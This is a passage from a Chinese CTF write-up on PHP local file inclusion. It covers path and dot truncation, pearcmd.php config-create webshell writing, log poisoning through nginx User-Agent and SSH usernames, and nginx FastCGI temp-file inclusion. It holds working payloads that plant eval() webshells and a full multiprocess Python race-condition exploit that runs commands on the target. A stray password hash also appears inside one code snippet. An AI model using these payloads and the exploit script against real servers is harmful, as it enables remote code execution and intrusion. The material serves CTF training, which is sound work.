+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ </span><br></pre></td></tr></table></figure>
+<p>执行后发现已经成功截断了后面的拓展名</p>
+<h4 id="点号截断文件包含"><a class="markdownIt-Anchor" href="#点号截断文件包含"></a> 点号截断文件包含</h4>
+<p>漏洞利用条件 点号截断包含只使用与 Windows 系统，点号的长度大于 256B 的时候，就可以造成拓展名截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include ($file.&quot;.html&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">$6$sqG18STD$4WTSFLekF5.slU7LFMfhzDdaWyAPWu1g8W7PZKXaOAAlkCBpcavS2HErsxP1xCEltAtxEweIVHFIf3BO5MH3z.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=test.txt.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+<p>发现已经成功截断了 html 拓展名</p>
+<h3 id="裸文件包含pearcmdphp文件包含写入shell"><a class="markdownIt-Anchor" href="#裸文件包含pearcmdphp文件包含写入shell"></a> 裸文件包含(pearcmd.php文件包含写入shell)</h3>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ForBreeze/p/17986029">利用pearcmd.php本地文件包含（LFI） - AllFalls - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/126772725?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126772725-blog-121042290.235%5Ev38%5Epc_relevant_anti_t3_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126772725-blog-121042290.235%5Ev38%5Epc_relevant_anti_t3_base&amp;utm_relevant_index=2">利用pearcmd.php文件包含拿shell（LFI）_pearcmd文件包含-CSDN博客</a></p>
+<h4 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 安装了 pear 扩展（pear 就是一个 php 扩展及应用的代码仓库，没有安装 pear 扩展的话就没有 pear.php 文件可以利用了，pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 --with-pear 才会安装。）</span><br><span class="line"></span><br><span class="line">2. 知道 pearcmd.php 文件的路径（默认路径是 /usr/local/lib/php/pearcmd.php）</span><br><span class="line"></span><br><span class="line">3. 开启了 register_argc_argv 选项（只有开启了，$_SERVER [‘argv’] 才会生效。）</span><br><span class="line"></span><br><span class="line">4. 有包含点，并且能包含 php 后缀的文件，而且没有 open_basedir 的限制。</span><br></pre></td></tr></table></figure>
+<h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题：</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    if(isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">        $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">        </span><br><span class="line">        if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        include($file.&quot;.php&quot;);</span><br><span class="line">        # Something in phpinfo.php!</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>题目过滤了常见的伪协议，然后提示说在 phpinfo.php 文件中有东西？file=phpinfo 看到一串敏感信息： fake 然后检查 register_argc_argv 发现都是 on。 结合标题，pear 很明显是 pear 裸文件包含。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php</span><br></pre></td></tr></table></figure>
+<p>简单解释一下： 首先得知道 $_SERVER [‘argv’] 通过 query_string 取值，并通过 + 作为分割符， 然后就是 config-create，阅读其代码和帮助，可以知道，它可以直接创建配置文件，这个命令需要传入两个参数，且第一个参数必须以 / 开头，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 这里的：/&amp;file=/usr/local/lib/php/pearcmd&amp;/ 就是第一个参数，由于 php 会将格式错误的代码忽视，所以这句话即起到将 /usr/local/lib/php/pearcmd 包含的作用，又写入了一句话木马文件的内容， 所以也可以这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/cmd.php</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[1]);die()?&gt;+shell7.php</span><br></pre></td></tr></table></figure>
+<p>最后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ?file=/tmp/cmd </span><br><span class="line"> </span><br><span class="line">#post </span><br><span class="line">cmd=system (&quot;cat /flag&quot;); 即可。</span><br></pre></td></tr></table></figure>
+<h3 id="日志文件包含"><a class="markdownIt-Anchor" href="#日志文件包含"></a> 日志文件包含</h3>
+<p>一般来说，这种文件包含形式可以细分为两种 —— 中间件日志包含和 ssh 日志包含</p>
+<h4 id="中间件日志文件包含"><a class="markdownIt-Anchor" href="#中间件日志文件包含"></a> 中间件日志文件包含</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line">web 中间件日志文件的存储位置已知，并且具有可读权限</span><br></pre></td></tr></table></figure>
+<p>这个所谓的中间件，在平常的比赛中通常是 apache,nginx 服务器，当然</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中间件可以是任何类型的软件，例如：</span><br><span class="line"></span><br><span class="line">消息队列系统（如 RabbitMQ、Apache Kafka）：允许应用程序异步交换数据和指令。</span><br><span class="line">Web 服务器（如 Apache, Nginx）：处理 HTTP 请求，并将它们路由到后台应用程序。</span><br><span class="line">数据库中间件：允许不同的数据库系统之间或应用程序与数据库之间的通信。</span><br><span class="line">应用服务器（如 Tomcat, WebLogic）：提供运行环境来部署、运行和管理 Web 应用程序。</span><br><span class="line">API 网关：管理微服务或服务导向架构中的 API 调用。</span><br></pre></td></tr></table></figure>
+<p>这种文件包含首先你得知道日志文件的路径，所以可以拿上面给的敏感路径试试，实在不知道可以通过先包含配置文件来确定日志文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+<h5 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//WEB 手要懂得搜索</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了很多，伪协议近乎全军覆没，但是没有关系，我们可以使用日志包含。 发送请求 GET /?file=/var/log/nginx/access.log HTTP/1.1 发现回显出的结果存在 User-Agent 的内容，所以可在在这里进行命令执行。 由于 include 会把文件当成 php 文件执行，所以我们可以这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1 </span><br><span class="line">Host: node5.anna.nssctf.cn:28449 </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent:  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 &lt;?php eval(&#x27;$_POST[&#x27;mima&#x27;]&#x27;);?&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+<p>这里 eval中不能用双引号，否则会和 index 文件中的 include 函数中的双引号起冲突。</p>
+<h4 id="ssh-日志文件包含"><a class="markdownIt-Anchor" href="#ssh-日志文件包含"></a> ssh 日志文件包含</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSH 日志文件包含的利用条件是：</span><br><span class="line">SSH 日志路径已知，并且具有可读权限</span><br></pre></td></tr></table></figure>
+<p>SSH 如果开启了日志记录的功能，那么会将 ssh 的连接日志记录到 ssh 日志文件当中 将连接的用户名设置成恶意代码，用命令连接服务器 192.168.1.1 的 ssh 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1</span><br></pre></td></tr></table></figure>
+<p>查看日志文件 <code>/var/log/auth.log</code>，可以观察到恶意代码已经写入到日志文件</p>
+<p>测试输入语句： <code>http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</code></p>
+<p>之后再向网页传入 POST 参数： <code>123=phpinfo</code></p>
+<p>就可以出现 phpinfo 的内容了</p>
+<h3 id="session-文件包含"><a class="markdownIt-Anchor" href="#session-文件包含"></a> session 文件包含</h3>
+<p>当可以获取 session 文件路径并且 session 文件的内容可控的的时候，就可以通过包含 session 文件进行攻击</p>
+<p><a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+<h3 id="临时文件包含"><a class="markdownIt-Anchor" href="#临时文件包含"></a> 临时文件包含</h3>
+<p><a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+<h2 id="nginx缓存文件包含shell"><a class="markdownIt-Anchor" href="#nginx缓存文件包含shell"></a> nginx缓存文件包含shell</h2>
+<p>一道非常有意思的题目，就是你电脑的CPU可能给你干碎</p>
+<p>用一个题来讲解：[HxpCTF2022&amp;2021 Web - Boogiepop Doesn’t Laugh](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/29/HxpCTF2022&amp;2021">https://boogipop.com/2023/03/29/HxpCTF2022&amp;2021</a> _ Web/)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;read&#x27;</span> ) === <span class="string">&#x27;read&#x27;</span> ? <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>) : <span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    find /var/www -<span class="built_in">type</span> d -<span class="built_in">exec</span> <span class="built_in">chmod</span> 555 &#123;&#125; \; &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    find /var/www -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">chmod</span> 444 &#123;&#125; \; &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root /tmp /var/tmp /var/lib/php/sessions &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 000 /tmp /var/tmp /var/lib/php/sessions</span></span><br></pre></td></tr></table></figure>
+<p>把 php tmp 目录以及一些临时目录都弄得不可写了</p>
+<blockquote>
+<p>当然可以直接用使用Filterchain</p>
+</blockquote>
+<p>A. 当 <code>action=read</code> 或没有 <code>action</code> 参数时：</p>
+<p>执行 <code>readfile($_GET['file'] ?? 'index.php')</code></p>
+<ul>
+<li><strong><code>readfile()</code></strong>：直接输出文件内容（作为纯文本）</li>
+</ul>
+<p>B. 当 <code>action</code> 不等于 <code>'read'</code> 时（如 <code>action=write</code>）：</p>
+<p>执行 <code>include_once($_GET['file'] ?? 'index.php')</code></p>
+<ul>
+<li><strong><code>include_once()</code></strong>：包含并执行 PHP 文件</li>
+</ul>
+<h3 id="nginx缓存机制"><a class="markdownIt-Anchor" href="#nginx缓存机制"></a> Nginx缓存机制</h3>
+<p>nginx的缓存文件，当我们的request body过大的时候，会在<code>/var/lib/nginx/fastcgi</code>目录产生缓存文件，文件内容就是我们溢出部分的内容，那么我们只需要来一段不断重复的一句话木马，然后包含它，即可完成LFI FastCGI Temp</p>
+<p>当PHP通过FastCGI模式运行时，如果POST请求体大小超过<code>client_body_buffer_size</code>配置，Nginx会将请求体写入临时文件：</p>
+<ul>
+<li>默认路径：<code>/var/lib/nginx/fastcgi/</code></li>
+<li>文件名格式：<code>client_body_temp/0000000012</code></li>
+</ul>
+<h3 id="关键时间窗口"><a class="markdownIt-Anchor" href="#关键时间窗口"></a> 关键时间窗口</h3>
+<ul>
+<li>Nginx接收大请求体 → 写入临时文件 → 传递给PHP</li>
+<li>在传递给PHP之前，临时文件会短暂存在</li>
+<li>可以通过条件竞争在文件删除前包含它</li>
+</ul>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3>
+<p><strong>绕过<code>include_once</code>的限制</strong>:</p>
+<p>问题：直接包含<code>/proc/34/fd/9</code>会显示为软链接且带有&quot;(deleted)&quot;后缀。</p>
+<p>涉及一个对软链接的bypass,使用路径遍历绕过：<code>/proc/self/fd/34/../../../34/fd/9</code></p>
+<blockquote>
+<ul>
+<li><code>realpath()</code>会解析符号链接，发现&quot;(deleted)&quot;</li>
+<li>路径遍历可以让PHP看到不同的路径，绕过<code>include_once</code>缓存</li>
+<li>随机路径前缀确保每次都是&quot;新&quot;文件路径</li>
+</ul>
+</blockquote>
+<p>或者使用随机路径前缀：<code>/proc/self/root</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">SERVER = <span class="string">&quot;http://192.168.43.103:49153&quot;</span></span><br><span class="line">NGINX_PIDS_CACHE = <span class="built_in">set</span>([<span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>])</span><br><span class="line"><span class="comment"># Set the following to True to use the above set of PIDs instead of scanning:</span></span><br><span class="line">USE_NGINX_PIDS_CACHE = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建会话句柄</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_requests_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="comment"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span></span><br><span class="line">    <span class="comment">#自定义HTTP适配器，创建连接池，消除tcp三次握手时延</span></span><br><span class="line">    adapter = requests.adapters.HTTPAdapter(pool_connections=<span class="number">1000</span>, pool_maxsize=<span class="number">10000</span>)</span><br><span class="line">    session.mount(<span class="string">&#x27;http://&#x27;</span>, adapter)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取Nginx主进程pid</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nginx_pids</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="keyword">if</span> USE_NGINX_PIDS_CACHE:</span><br><span class="line">        <span class="keyword">return</span> NGINX_PIDS_CACHE</span><br><span class="line">    nginx_pids = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        <span class="comment">#查找临时文件的FD</span></span><br><span class="line">        cmdline = requests_session.get(SERVER + <span class="string">f&quot;/?action=read&amp;file=/proc/<span class="subst">&#123;i&#125;</span>/cmdline&quot;</span>).text</span><br><span class="line">        <span class="keyword">if</span> cmdline.startswith(<span class="string">&quot;nginx: worker process&quot;</span>):</span><br><span class="line">            nginx_pids.add(i)</span><br><span class="line">    <span class="keyword">return</span> nginx_pids</span><br><span class="line"> </span><br><span class="line"><span class="comment">#向Nginx发送过大Body，使其生成临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">requests_session, body_size=<span class="number">1024000</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       <span class="comment"># 发送大请求体，触发Nginx创建临时文件</span></span><br><span class="line">        payload = <span class="string">&#x27;&lt;?php system(&quot;/readflag&quot;);__halt_compiler(); ?&gt;&#x27;</span></span><br><span class="line">        requests_session.post(SERVER + <span class="string">&quot;/?action=read&amp;file=/bla&quot;</span>, data=(payload + (<span class="string">&quot;a&quot;</span> * (body_size - <span class="built_in">len</span>(payload)))))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#循环发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_worker</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_payload(requests_session)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多线程发送Payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_multiprocess</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="comment"># Use all CPUs to send the payload as request body for Nginx</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(multiprocessing.cpu_count()):</span><br><span class="line">        p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))</span><br><span class="line">        p.start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#生成随机路径/proc/pid/cwd/proc/pid/root绕过php软连接stat</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_path_prefix</span>(<span class="params">nginx_pids</span>):</span><br><span class="line">    <span class="comment"># This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1&gt;/cwd/proc/&lt;nginx pid 2&gt;/root/proc/&lt;nginx pid 3&gt;/root</span></span><br><span class="line">    path = <span class="string">&quot;&quot;</span></span><br><span class="line">    component_num = random.randint(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(component_num):</span><br><span class="line">        pid = random.choice(nginx_pids)</span><br><span class="line">        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            path += <span class="string">f&quot;/proc/<span class="subst">&#123;pid&#125;</span>/cwd&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path += <span class="string">f&quot;/proc/<span class="subst">&#123;pid&#125;</span>/root&quot;</span></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"><span class="comment">#遍历读fd文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">requests_session, nginx_pid, fd, nginx_pids</span>):</span><br><span class="line">    nginx_pid_list = <span class="built_in">list</span>(nginx_pids)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        path = generate_random_path_prefix(nginx_pid_list)</span><br><span class="line">        path += <span class="string">f&quot;/proc/<span class="subst">&#123;nginx_pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = requests_session.get(SERVER + <span class="string">f&quot;/?action=include&amp;file=<span class="subst">&#123;path&#125;</span>&quot;</span>).text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found flag! &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(d)</span><br><span class="line">            exit()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多线程竞争临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_worker</span>(<span class="params">requests_session, nginx_pid, nginx_pids</span>):</span><br><span class="line">    <span class="comment"># Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it&#x27;s very common for the request body FD to open within this range</span></span><br><span class="line">    <span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">45</span>):</span><br><span class="line">        thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))</span><br><span class="line">        thread.start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多进程竞争临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_multiprocess</span>(<span class="params">requests_session, nginx_pids</span>):</span><br><span class="line">    <span class="keyword">for</span> nginx_pid <span class="keyword">in</span> nginx_pids:</span><br><span class="line">        p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))</span><br><span class="line">        p.start()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Creating requests session&#x27;</span>)</span><br><span class="line">    requests_session = create_requests_session()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Getting Nginx pids&#x27;</span>)</span><br><span class="line">    nginx_pids = get_nginx_pids(requests_session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[DEBUG] Nginx pids: <span class="subst">&#123;nginx_pids&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Starting payload sending&#x27;</span>)</span><br><span class="line">    send_payload_multiprocess(requests_session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Starting fd readers&#x27;</span>)</span><br><span class="line">    read_file_multiprocess(requests_session, nginx_pids)</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>信息收集</strong>：获取Nginx工作进程的PID</li>
+<li><strong>创建临时文件</strong>：多进程发送大请求体，触发Nginx创建缓存文件</li>
+<li><strong>文件描述符发现</strong>：扫描<code>/proc/&lt;nginx_pid&gt;/fd/</code>中的文件描述符</li>
